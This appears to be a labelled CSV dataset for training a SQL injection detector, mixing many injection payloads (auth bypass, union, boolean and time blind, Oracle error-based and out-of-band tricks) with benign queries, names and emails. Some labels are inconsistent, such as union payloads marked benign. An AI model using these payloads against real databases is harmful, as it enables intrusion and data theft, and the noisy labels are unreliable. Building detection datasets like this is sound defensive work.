payload_norm,payload_delex,sqli_type,db_engine,confidence,is_attack
"select * from users WHERE username = ""-5880\' ) ) and ( ( \'rwgl\' = \'rwgl"" and username = ""1\' ) ) )",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ ) ) ),auth_bypass,generic,0.6,True
"-8308"" ) union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#","- __INT__ ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__",union_based,generic,0.7,True
SELECT distant ( s ) FROM establish UNION,select __IDENT__ ( __IDENT__ ) from __IDENT__ union,benign,generic,1.0,False
"1"" ) ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --","__INT__ ) ) ) or __INT__ = ( select count ( * ) from __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ ) - -",boolean_blind,generic,0.8,True
"select * from users WHERE username = ""1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" and username = ""1\' ) ) and ( ( \'qtul\' like \'qtul"" and username = ""-9501\' ) and ( \'mndw\' = \'mndw""",select * from __IDENT__ where __IDENT__ = __STR__ and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) __STR__ __INT__ __STR__ __IDENT__ __STR__ __IDENT__ __STR__ - __INT__ __STR__ __IDENT__ __STR__ __IDENT__,error_based,oracle,0.95,True
"1%"" and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","__INT__ % "" and __INT__ = ( select count ( * ) from __IDENT__ ( __INT__ , __INT__ ) ) - -",time_blind,postgresql,0.7,True
"SELECT support, our+ ', ' + political+ ' ' + fierce+ ', ' + shallow AS far FROM again","select __IDENT__ , __IDENT__ + __STR__ + __IDENT__ + __STR__ + __IDENT__ + __STR__ + __IDENT__ as __IDENT__ from __IDENT__",benign,generic,1.0,False
"SELECT Orders.enjoyrID, Employees.organization, Employees.she FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.singleID ORDER BY Orders.awareID","select __IDENT__ , __IDENT__ , __IDENT__ from __IDENT__ join __IDENT__ on __IDENT__ = __IDENT__ order by __IDENT__",benign,generic,1.0,False
-6665' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 'winx' = 'winx,- __INT__ __STR__ __IDENT__ __STR__ __IDENT__,out_of_band,oracle,0.9,True
"select * from users WHERE username = ""-7199\' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""-5152\' ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )","select * from __IDENT__ where __IDENT__ = "" - __INT__ __STR__ ) ) or __INT__ = __IDENT__ ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) )",out_of_band,oracle,0.85,True
"select * from users WHERE username = ""-9295 ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-3733\' ) )","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = "" - __INT__ ) )",error_based,oracle,0.95,True
roco@forohh.ge,__IDENT__,benign,generic,0.9,False
lora@rocofer.jobs,__IDENT__,benign,generic,0.9,False
SELECT MIN ( pool ) AS earlier FROM happen,select min ( __IDENT__ ) as __IDENT__ from __IDENT__,benign,generic,1.0,False
SELECT COUNT ( mind ) FROM dog,select count ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False
"select * from users WHERE username = ""-3880 ) and username = ""-3729\' ) ) and ( ( \'czed\' = \'czed""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ __STR__ __IDENT__ __STR__ __IDENT__,boolean_blind,generic,0.5,True
1.72E+15,__IDENT__ + __INT__,benign,generic,0.9,False
e2paq48t282r,__IDENT__,benign,generic,0.9,False
hlinka,__IDENT__,benign,generic,0.9,False
"1"" ) ) as gvpm where 5170 = 5170 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --","__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = ( select count ( * ) from __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ ) - -",heavy_query,mssql,0.7,True
"select * from users WHERE username = ""-5863"" or username = ""-7746\' ) ) ) || 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) temp ( ( ( \'itxy' like \'itxy""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,error_based,oracle,0.9,True
"select * from users WHERE username = ""1\'|| ( select \'ylio\' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\'"" or username = ""-1252\' ) and ( \'pzxh\' like \'pzxh""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,boolean_blind,postgresql,0.9,True
kashfi@cropbay.jobs,__IDENT__,benign,generic,0.9,False
SELECT wing FROM college,select __IDENT__ from __IDENT__,benign,generic,1.0,False
"-1051"" ) where 6586 = 6586 or 6647 = 6738#",- __INT__ ) where __INT__ = __INT__ or __INT__ = __INT__,boolean_blind,generic,0.5,True
1%' ) ) union all select null--,__INT__ % ' ) ) union all select null - -,benign,generic,1.0,False
"select * from users WHERE username = ""1\' or username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""1\' ) ) as wkys where 2478 = 2478 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --""",select * from __IDENT__ where __IDENT__ = __STR__,boolean_blind,oracle,0.8,True
1%' union all select null#,__INT__ % ' union all select null,union_based,generic,0.7,True
"select * from users WHERE username = ""-5291\' ) ) or username = ""-7072\' ) and username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__ __IDENT__ from dual where __INT__ = __INT__,auth_bypass,generic,0.5,True
"select * from users WHERE username = ""1"" and 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""1%\' ) ) ) and ( ( ( \'%\' = \'""","select * from __IDENT__ where __IDENT__ = __STR__ and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - __STR__ __INT__ % \ __STR__ % \ __STR__ """,error_based,oracle,0.95,True
"SELECT * FROM users WHERE username = ""1\'|| ( select \'jpso\' from dual where 9357 = 9357 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) ||\'"" OR username = ""1\', ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4250 = 4250 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) """,select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,heavy_query,mysql,0.85,True
"SELECT A.CustomerName AS CustomerName1, B.CustomerName AS CustomerName2, A.CityFROM Customers A, Customers BWHERE A.CustomerID <> B.CustomerID AND A.City = B.City","select __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ __IDENT__ __IDENT__ , __IDENT__ __IDENT__ __IDENT__ < > __IDENT__ and __IDENT__ = __IDENT__",benign,mysql,0.9,False
SELECT * FROM build FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM sleep,select * from __IDENT__ fetch first __INT__ __IDENT__ rows __IDENT__ top __INT__ * from sleep,benign,generic,1.0,False
SELECT * FROM news WHERE globe = 'month' OR needed = 'throat',select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,benign,generic,1.0,False
"1"" ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( ""znzb"" like ""znzb",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,time_blind,postgresql,0.7,True
"select * from users WHERE username = ""1\' ) ) ) or username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""1\' where 8537 = 8537 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.95,True
milton,__IDENT__,benign,generic,0.9,False
"select * from users WHERE username = ""1\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""-3899\' ) where 8152 = 8152 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.9,True
"1"" where 2886 = 2886",__INT__ where __INT__ = __INT__,boolean_blind,generic,0.5,True
"-9810' ) where 4361 = 4361 or elt ( 1032 = 1032,3623 ) --","- __INT__ ) where __INT__ = __INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) - -",benign,generic,1.0,False
urea bernat,__IDENT__ __IDENT__,benign,generic,0.9,False
63298862x,__IDENT__,benign,generic,0.9,False
37655511a,__IDENT__,benign,generic,0.9,False
beaumont@lasmilyuna.gi,__IDENT__,benign,generic,0.9,False
"SELECT * FROM users WHERE username = ""1 ) ) as atiy where 3855 = 3855 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"" OR username = ""1\' ) ) as bswc where 1635 = 1635",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __INT__ ) ) as __IDENT__ where __INT__ = __INT__,boolean_blind,oracle,0.8,True
1.02606E+15,__IDENT__ + __INT__,benign,generic,0.9,False
"select * from users WHERE username = ""-1254"" or username = ""1\' where 8537 = 8537 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,error_based,oracle,0.95,True
"-9119"" ) where 9237 = 9237 or 8571 = 8571--",- __INT__ ) where __INT__ = __INT__ or __INT__ = __INT__ - -,boolean_blind,generic,0.5,True
"select * from users WHERE username = ""1%\' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""-5863"" or username = ""-1549\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",select * from __IDENT__ where __IDENT__ = __INT__ % \ __STR__ ) or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ),error_based,oracle,0.95,True
"-6492' ) union all select 7204,7204--","- __INT__ ) union all select __INT__ , __INT__ - -",union_based,generic,0.85,True
1' ) and 3560 = 5467--,__INT__ ) and __INT__ = __INT__ - -,boolean_blind,generic,0.8,True
1' ) where 2330 = 2330 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,__INT__ ) where __INT__ = __INT__ and ( select * from ( select ( sleep ( __INT__ ) ) ) __IDENT__ ) - -,time_blind,mysql,0.7,True
"select * from users WHERE username = ""1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'yxpi\' = \'yxpi"" or username = ""1 ) where 3381 = 3381",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __INT__ ) where __INT__ = __INT__,error_based,mssql,0.8,True
"select * from users WHERE username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) ||\'"" and username = ""-8021\' ) )","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ ) )",error_based,oracle,0.95,True
"1 ) where 8630 = 8630 union all select null,null--","__INT__ ) where __INT__ = __INT__ union all select null , null - -",benign,generic,1.0,False
1'+ ( select zwsr where 6567 = 6567,__INT__ + ( select __IDENT__ where __INT__ = __INT__,boolean_blind,generic,0.5,True
"select * from users WHERE username = ""-1985 ) ) ) and ( ( ( 1248 = 1248"" and username = ""-6190\' ) where 2621 = 2621 or username = ""1\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'jzpb\' = \'jzpb""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.9,True
"select * from users WHERE username = ""1 ) ) as iihk where 5414 = 5414 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"" and username = ""-8828 ) ) as ospo where 2141 = 2141","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ ) ) as __IDENT__ where __INT__ = __INT__",out_of_band,oracle,0.9,True
select pg_sleep ( 5 ) # pjvi,select __IDENT__ ( __INT__ ) # __IDENT__,time_blind,postgresql,0.9,True
SELECT somebody ( s ) FROM private SELECT future FROM state,select __IDENT__ ( __IDENT__ ) from __IDENT__ select __IDENT__ from __IDENT__,benign,generic,1.0,False
SELECT TOP 3 * FROM hay WHERE religious = 'battle' SELECT * FROM slip,select top __INT__ * from __IDENT__ where __IDENT__ = __STR__ select * from __IDENT__,benign,mysql,0.9,False
nanclares espejo,__IDENT__ __IDENT__,benign,generic,0.9,False
SELECT ocean ( s ) FROM wolf UNION,select __IDENT__ ( __IDENT__ ) from __IDENT__ union,benign,generic,1.0,False
flixmara,__IDENT__,benign,generic,0.9,False
valdemaluque,__IDENT__,benign,generic,0.9,False
1.05923E+15,__IDENT__ + __INT__,benign,generic,0.9,False
"-3775' ) as rqet where 7092 = 7092 or elt ( 1032 = 1032,3623 ) --","- __INT__ ) as __IDENT__ where __INT__ = __INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) - -",boolean_blind,mysql,0.7,True
canute,__IDENT__,benign,generic,0.9,False
gierasch.casini@goovitae.cu,__IDENT__,benign,generic,0.9,False
"1 ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 4277 = 4277","__INT__ ) ) or __INT__ = ( select count ( * ) from __IDENT__ ( __INT__ , __INT__ ) ) and ( ( __INT__ = __INT__",heavy_query,postgresql,0.7,True
SELECT * FROM today WHERE bottle = 'importance' FETCH FIRST 3 ROWS ONLY,select * from __IDENT__ where __IDENT__ = __STR__ fetch first __INT__ rows only,benign,generic,1.0,False
SELECT COUNT ( share ) FROM apple,select count ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False
1'|| ( select 'jjpy' from dual where 6295 = 6295,__INT__ __STR__ __IDENT__ from dual where __INT__ = __INT__,boolean_blind,oracle,0.7,True
najli,__IDENT__,benign,generic,0.9,False
"select * from users WHERE username = ""-1641\' ) ) and 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-2733\' ) ) )","select * from __IDENT__ where __IDENT__ = "" - __INT__ __STR__ ) ) )",error_based,oracle,0.95,True
"select * from users WHERE username = ""1\' ) ) and ( ( \'rggg\' = \'rggg"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""1",select * from __IDENT__ where __IDENT__ = __STR__ and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - __STR__ __INT__,boolean_blind,oracle,0.9,True
"select * from users WHERE username = ""1\' ) as wpmv where 1479 = 1479 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and ( \'ulkq\' = \'ulkq"" and username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ ) ) and __INT__ = cast ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) __IDENT__ | | ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) as __IDENT__ ),boolean_blind,oracle,0.9,True
